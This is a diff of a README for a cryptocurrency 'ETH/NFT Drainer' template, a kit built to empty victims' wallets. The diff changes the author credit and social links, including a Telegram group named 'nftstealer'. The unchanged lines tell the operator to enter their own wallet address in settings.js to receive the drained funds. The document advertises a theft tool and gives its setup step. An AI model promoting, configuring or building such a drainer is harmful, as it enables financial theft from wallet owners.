@@ -1,4 +1,4 @@
-# ***🌙 Please credit me @0xTracey***
+# ***🌙 Please credit me @Alcxpone***
 ### <center>🖼️ Drainer Template / ETH Drainer / NFT Drainer
 ![image](https://user-images.githubusercontent.com/109088488/178377411-c89b5a3e-1cdd-4780-9d91-607a39e1ab8e.png)
 ---
@@ -17,11 +17,10 @@
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 
-To get instant support, contact me on [@0xTracey](https://t.me/0xTracey)
-
 ## `🌊 Socials`
 
-- Telegram: https://t.me/0xTracey
+- Telegram: termed, soon
+- Instagram: https://instagram.com/clyde.nft
 - Group: https://t.me/nftstealer
 
 ##### Please ⭐ the repo to support this project & follow next updates
